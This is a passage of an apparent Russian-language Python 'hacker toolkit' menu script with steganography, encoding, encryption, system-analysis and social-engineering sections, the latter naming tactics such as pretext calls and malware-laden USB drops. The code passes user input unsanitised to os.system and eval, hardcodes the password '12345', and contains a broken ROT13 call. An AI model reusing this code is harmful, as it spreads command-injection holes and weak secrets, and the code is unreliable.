    print("[+] Сообщение скрыто в видео")

def stego_text():
    file = input("[+] Текст: ")
    message = input("[+] Сообщение: ")
    os.system(f"echo '{message}' > /tmp/hidden.txt")
    os.system(f"cat /tmp/hidden.txt >> {file}")
    print("[+] Сообщение скрыто в тексте")

def stego_hide():
    print("[+] Скрытие файлов")
    os.system("cat file.txt >> image.jpg")

def stego_extract():
    file = input("[+] Файл: ")
    os.system(f"strings {file} | grep -i hidden")

def stego_lsb():
    print("[+] LSB-стеганография")
    os.system("echo 'используй steghide'")

def stego_metadata():
    file = input("[+] Файл: ")
    os.system(f"exiftool {file}")

def stego_checksum():
    file = input("[+] Файл: ")
    print(f"[+] MD5: {hashlib.md5(open(file,'rb').read()).hexdigest()}")

def stego_all():
    print("[+] ВСЕ МЕТОДЫ СТЕГАНОГРАФИИ ЗАПУЩЕНЫ")
    stego_image()
    stego_audio()
    stego_video()
    stego_text()
    stego_hide()
    stego_extract()
    stego_lsb()
    stego_metadata()
    stego_checksum()

# Утилиты
def util_base64():
    text = input("[+] Текст: ")
    print(f"[+] Base64: {base64.b64encode(text.encode()).decode()}")

def util_hex():
    text = input("[+] Текст: ")
    print(f"[+] Hex: {text.encode().hex()}")

def util_rot13():
    text = input("[+] Текст: ")
    print(f"[+] ROT13: {text.encode('rot13')}")

def util_hash():
    text = input("[+] Текст: ")
    print(f"[+] MD5: {hashlib.md5(text.encode()).hexdigest()}")
    print(f"[+] SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
    print(f"[+] SHA256: {hashlib.sha256(text.encode()).hexdigest()}")

def util_qr():
    data = input("[+] Данные: ")
    os.system(f"qrencode -o qr.png '{data}'")
    print("[+] QR-код: qr.png")

def util_barcode():
    data = input("[+] Данные: ")
    os.system(f"zint -b 58 -d '{data}' -o barcode.png")
    print("[+] Штрихкод: barcode.png")

def util_random():
    print(f"[+] Случайное число: {random.randint(1, 1000000)}")

def util_sort():
    print("[+] Сортировка")
    nums = input("[+] Введите числа через запятую: ")
    print(f"[+] Сортировка: {sorted(map(int, nums.split(',')))}")

def util_filter():
    print("[+] Фильтр")
    nums = input("[+] Введите числа через запятую: ")
    print(f"[+] Четные: {[n for n in map(int, nums.split(',')) if n % 2 == 0]}")

def util_all():
    print("[+] ВСЕ УТИЛИТЫ ЗАПУЩЕНЫ")
    util_base64()
    util_hex()
    util_rot13()
    util_hash()
    util_qr()
    util_barcode()
    util_random()
    util_sort()
    util_filter()

# Игры
def game_guess():
    print("[+] Угадай число (1-100)")
    number = random.randint(1, 100)
    while True:
        guess = int(input("[>] Ваш вариант: "))
        if guess == number:
            print("[+] Угадал!")
            break
        elif guess < number:
            print("[+] Больше")
        else:
            print("[+] Меньше")

def game_snake():
    print("[+] Snake (не реализован)")

def game_tic_tac_toe():
    print("[+] Tic Tac Toe (не реализован)")

def game_hangman():
    print("[+] Hangman (не реализован)")

def game_blackjack():
    print("[+] Blackjack (не реализован)")

def game_poker():
    print("[+] Poker (не реализован)")

def game_minesweeper():
    print("[+] Minesweeper (не реализован)")

def game_chess():
    print("[+] Chess (не реализован)")

def game_trivia():
    print("[+] Trivia (не реализован)")

def game_all():
    print("[+] ВСЕ ИГРЫ ЗАПУЩЕНЫ")

# Социальная инженерия
def social_phishing():
    print("[+] Фишинг")
    phish_web()

def social_pretexting():
    print("[+] Претекстинг")
    print("Звонок жертве с просьбой сбросить пароль")

def social_baiting():
    print("[+] Бейтинг")
    print("Оставление USB-флешки с вредоносом")

def social_quid_pro_quo():
    print("[+] Quid Pro Quo")
    print("Предложение помощи в обмен на пароль")

def social_tailgating():
    print("[+] Tailgating")
    print("Проход за сотрудником в офис")

def social_impersonation():
    print("[+] Имитация")
    print("Представление другим человеком")

def social_fake_identity():
    print("[+] Фейковая личность")
    print("Создание поддельного профиля")

def social_emotional():
    print("[+] Эмоциональная атака")
    print("Использование страха или жадности")

def social_urgency():
    print("[+] Срочность")
    print("Создание искусственного дедлайна")

def social_all():
    print("[+] ВСЕ МЕТОДЫ СОЦИАЛЬНОЙ ИНЖЕНЕРИИ ЗАПУЩЕНЫ")

# Криптография
def crypto_aes():
    print("[+] AES")
    encrypt_aes()

def crypto_rsa():
    print("[+] RSA")
    encrypt_rsa()

def crypto_des():
    print("[+] DES")
    file = input("[+] Файл: ")
    os.system(f"openssl enc -des -salt -in {file} -out {file}.des -pass pass:12345")

def crypto_3des():
    print("[+] 3DES")
    file = input("[+] Файл: ")
    os.system(f"openssl enc -des3 -salt -in {file} -out {file}.3des -pass pass:12345")

def crypto_blowfish():
    print("[+] Blowfish")
    file = input("[+] Файл: ")
    os.system(f"openssl enc -bf -salt -in {file} -out {file}.bf -pass pass:12345")

def crypto_twofish():
    print("[+] Twofish")
    os.system("echo 'используй VeraCrypt'")

def crypto_rc4():
    print("[+] RC4")
    file = input("[+] Файл: ")
    os.system(f"openssl enc -rc4 -salt -in {file} -out {file}.rc4 -pass pass:12345")

def crypto_cast5():
    print("[+] CAST5")
    file = input("[+] Файл: ")
    os.system(f"openssl enc -cast5 -salt -in {file} -out {file}.cast5 -pass pass:12345")

def crypto_idea():
    print("[+] IDEA")
    file = input("[+] Файл: ")
    os.system(f"openssl enc -idea -salt -in {file} -out {file}.idea -pass pass:12345")

def crypto_all():
    print("[+] ВСЕ МЕТОДЫ КРИПТОГРАФИИ ЗАПУЩЕНЫ")
    crypto_aes()
    crypto_rsa()
    crypto_des()
    crypto_3des()
    crypto_blowfish()
    crypto_twofish()
    crypto_rc4()
    crypto_cast5()
    crypto_idea()

# Анализ
def analyze_traffic():
    print("[+] Анализ трафика")
    os.system("tcpdump -i eth0 -n")

def analyze_logs():
    print("[+] Анализ логов")
    os.system("tail -f /var/log/syslog")

def analyze_memory():
    print("[+] Анализ памяти")
    os.system("free -h")

def analyze_disk():
    print("[+] Анализ диска")
    os.system("df -h")

def analyze_network():
    print("[+] Анализ сети")
    os.system("netstat -tulpn")

def analyze_processes():
    print("[+] Анализ процессов")
    os.system("ps aux")

def analyze_performance():
    print("[+] Анализ производительности")
    os.system("top -n 1")

def analyze_security():
    print("[+] Анализ безопасности")
    os.system("lynis audit system")

def analyze_vulnerabilities():
    print("[+] Анализ уязвимостей")
    os.system("nmap -sV --script=vuln 127.0.0.1")

def analyze_all():
    print("[+] ВСЕ АНАЛИЗЫ ЗАПУЩЕНЫ")
    analyze_traffic()
    analyze_logs()
    analyze_memory()
    analyze_disk()
    analyze_network()
    analyze_processes()
    analyze_performance()
    analyze_security()
    analyze_vulnerabilities()

# Прочее
def misc_qr():
    data = input("[+] Данные: ")
    os.system(f"qrencode -o qr.png '{data}'")
    print("[+] QR-код: qr.png")

def misc_barcode():
    data = input("[+] Данные: ")
    os.system(f"zint -b 58 -d '{data}' -o barcode.png")
    print("[+] Штрихкод: barcode.png")

def misc_random():
    print(f"[+] Случайное число: {random.randint(1, 1000000)}")

def misc_sort():
    nums = input("[+] Введите числа через запятую: ")
    print(f"[+] Сортировка: {sorted(map(int, nums.split(',')))}")

def misc_filter():
    nums = input("[+] Введите числа через запятую: ")
    print(f"[+] Четные: {[n for n in map(int, nums.split(',')) if n % 2 == 0]}")

def misc_convert():
    text = input("[+] Текст: ")
    print(f"[+] Base64: {base64.b64encode(text.encode()).decode()}")
    print(f"[+] Hex: {text.encode().hex()}")

def misc_calc():
    expr = input("[+] Выражение: ")
    print(f"[+] Результат: {eval(expr)}")

def misc_clock():
    print(f"[+] Время: {time.strftime('%H:%M:%S')}")

def misc_weather():
    print("[+] Погода")
    os.system("curl -s wttr.in")

def misc_all():
    print("[+] ВСЕ ПРОЧИЕ ФУНКЦИИ ЗАПУЩЕНЫ")
    misc_qr()
    misc_barcode()
    misc_random()
    misc_sort()
    misc_filter()
    misc_convert()
    misc_calc()
    misc_clock()
    misc_weather()

if __name__ == "__main__":
    menu()
